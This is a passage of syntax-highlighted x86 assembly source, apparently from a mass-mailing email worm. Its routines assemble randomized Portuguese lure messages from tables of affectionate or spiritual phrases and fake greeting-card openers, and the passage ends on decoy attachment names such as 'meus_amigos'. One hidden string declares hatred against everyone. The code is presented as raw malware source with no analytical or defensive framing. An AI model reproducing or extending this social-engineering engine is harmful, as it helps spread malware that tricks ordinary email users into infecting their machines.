   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_rename000</span><span class="sc0"> </span><span class="sc1">;16</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0"> </span><span class="sc1">;12</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   8  buffer</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">join_param</span><span class="sc0"> </span><span class="sc1">;4</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">do_msgs</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_seicho000</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_joiner000</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_seicho000</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">join_param</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">join_param</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">jp0</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">jp2</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; table</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">jp2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jp0</span><span class="sc0">

   </span><span class="sc5">jp2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc1">;   subject</span><span class="sc0">
   </span><span class="sc1">;   escolhido randomicamente</span><span class="sc0">

   </span><span class="sc5">msg_subject00</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Queria estar ao seu lado...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_subject01</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Pensando hoje em voce :)'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_subject02</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Namoro ou amizade ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_subject03</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Tornando sua vida mais feliz'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_subject04</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Apesar de tudo eu ainda me lembro de voce'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_subject05</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Voce esqueceu de mim ? :('</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_subject06</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Continuo te amando...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_subject07</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Vamos nos alegrar ???'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">tbl_msg_subject00</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject00</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject01</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject02</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject03</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject04</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject05</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject06</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_subject07</span><span class="sc0">

   </span><span class="sc1">;   inicio da mensagem</span><span class="sc0">
   </span><span class="sc1">;   escolhido randomicamente</span><span class="sc0">

   </span><span class="sc5">msg_padrao000</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Voce recebeu um cartao virtual'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_padrao001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Caro amigo:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_padrao002</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Perolas da vida:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_padrao003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Em rumo da felicidade:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_padrao004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Mensagens de conforto:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_padrao005</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Expressando meus sentimentos:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_padrao006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Carinho e confianca:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_padrao007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'O amor e a amizade:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">tbl_msg_padrao000</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao000</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao001</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao002</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao003</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao004</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao005</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao006</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_padrao007</span><span class="sc0">

   </span><span class="sc1">;   frases do meio</span><span class="sc0">
   </span><span class="sc1">;   escolhidas aleatoriamente, formando textos</span><span class="sc0">

   </span><span class="sc5">msg_seicho000</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Se voce pensar em mim, nao pense em me procurar; me procure sem pensar'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Alegre esperanÁa atrai destino feliz'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho002</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Cada momento de sua vida e um ponto de partida'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Quando se deparar com um problema dificil, volva sua mente a Deus'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Quem trabalha em prol dos semelhantes tem o Poder de atrair as pessoas'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho005</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'O que ha de mais bonito em voce e o seu sorriso'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Quem trabalha com alegria torna-se saudavel'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Todas as experiencias sao esmeris que dao polimento a sua alma'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho008</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Quem abencoa os outros sera abencoado'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho009</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'A semente plantada nao germina imediatamente. A germinacao requer algum tempo'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho010</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'A dedicacao sincera toca o coracao de todas as pessoas'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho011</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'No final, vencem os que oram em vez de temer, e agem em vez de lamentar'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho012</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'A verdadeira riqueza esta na mente disposta a doar. Quem so quer receber acaba perdendo a riqueza'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho013</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Reconhecer, amar e elogiar devem estar sempre presentes'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho014</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'O amor È uma virtude imutavel, eterna'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho015</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Dificuldade, queda ou fracasso sao oportunidades para progredir'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho016</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Status, fama, bens materiais sao ilusoes. Nao persiga as ilusoes'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho017</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Abandonando o espirito de dependencia, passa a fluir a infinita forca vital'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho018</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Marido e mulher sao dua metades da mesma alma que se conheceram e casaram'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho019</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Na vida, nao se pode regatear. Cada um recebe o que condiz com a sua mente'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho020</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Somos todos semeadores. Plantemos sempre sementes do bem'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho021</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Deus se manifesta a nos quando nossa mente se liberta do apego'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho022</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Aquele que agradece aos antepassados prospera naturalmente'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho023</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Exponha a Deus todas as suas aflicoes e angustias'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho024</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Nao se apegue; Mas seja atento e cuidadoso'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho025</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Flui a forca infinita nas pessoas que trabalham com gratidao'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho026</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'O reino de Deus existe aqui e agora, inclusive dentro de voce'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho027</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Agradeca a Deus pelo trabalho que lhe e atribuido agora'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho028</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'As pessoas constroem o seu destino com palavras'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho029</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Todas as coisas do ceu e da terra sao seus amigos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho030</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'O amor e uma grande forca curativa'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_seicho031</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Voce esta sempre cercado por um mar de gracas divinas'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'E que assim se expresse meu Ûdio contra todos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">tbl_msg_seicho000</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho000</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho001</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho002</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho003</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho004</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho005</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho006</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho007</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho008</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho009</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho010</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho011</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho012</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho013</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho014</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho015</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho016</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho017</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho018</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho019</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho020</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho021</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho022</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho023</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho024</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho025</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho026</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho027</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho028</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho029</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho030</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_seicho031</span><span class="sc0">

   </span><span class="sc1">;   conector das mensagens</span><span class="sc0">
   </span><span class="sc1">;   escolhidos aleatoriamente</span><span class="sc0">

   </span><span class="sc5">msg_joiner000</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' entao '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_joiner001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' pois '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_joiner002</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' voce sabia ? … verdade, '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_joiner003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' , '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_joiner004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' e sabendo disso, '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_joiner005</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' logo conclui-se que '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_joiner006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' ,e È preciso acreditar no prÛximo, '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_joiner007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' portanto '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">tbl_msg_joiner000</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner000</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner001</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner002</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner003</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner004</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner005</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner006</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_joiner007</span><span class="sc0">

   </span><span class="sc1">;   nomes para os arquivos</span><span class="sc0">
   </span><span class="sc1">;   escolhidos aleatoriamente</span><span class="sc0">

   </span><span class="sc5">msg_rename000</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'meus_amigos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'amizade'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
